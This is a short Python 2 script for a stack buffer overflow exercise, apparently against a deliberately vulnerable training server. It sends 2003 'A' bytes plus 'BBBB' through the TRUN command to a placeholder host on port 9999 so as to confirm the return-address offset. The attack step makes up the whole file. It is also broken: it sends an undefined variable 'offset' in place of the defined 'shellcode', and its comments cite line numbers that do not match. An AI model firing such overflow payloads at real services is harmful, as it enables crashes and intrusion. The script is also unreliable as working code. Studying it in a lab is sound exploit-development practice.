#!/usr/bin/python2
import sys, socket

# Change shellcode to Offset defined above on line 8
# Change IP and Port on line 13 to Target and Port Application is running on
# Change TRUN on line 14 to Command you are testing

shellcode = "A" * 2003 + "B" * 4

try:
    print "\nLocating Offset..."
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("x.x.x.x", 9999))
    s.send(('TRUN /.:/' + offset))
    s.close()

except:            
    print "\nError Connecting to Server"
    sys.exit()
